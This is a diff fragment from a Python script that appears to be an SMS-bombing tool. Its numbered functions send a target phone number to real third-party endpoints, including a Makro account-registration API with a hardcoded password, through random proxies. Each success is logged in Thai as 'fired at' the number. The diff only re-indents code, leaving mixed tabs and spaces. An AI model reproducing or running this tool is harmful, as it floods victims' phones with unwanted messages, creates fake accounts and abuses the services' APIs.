@@ -47,7 +47,7 @@ else:
     print()
     print()
 
-    def send_task(phone_num):
+def send_task(phone_num):
         try:
             SMS(phone_num, 1)
             headers = {
@@ -794,10 +794,10 @@ def api81(phone):
 		print(f"ยิงไปที่ {phone} สำเร็จ")
 		
 def api82(phone):
-	    da = datetime.datetime.now()
-	    ok = da.strftime("%H:%M:%S")
-	    r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
-	    if r.status_code == 200 or r.status_code == 201:
+    da = datetime.datetime.now()
+    ok = da.strftime("%H:%M:%S")
+    r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
+    if r.status_code == 200 or r.status_code == 201:
 		print(f"ยิงไปที่ {phone} สำเร็จ")
 	
 def api83(phone):
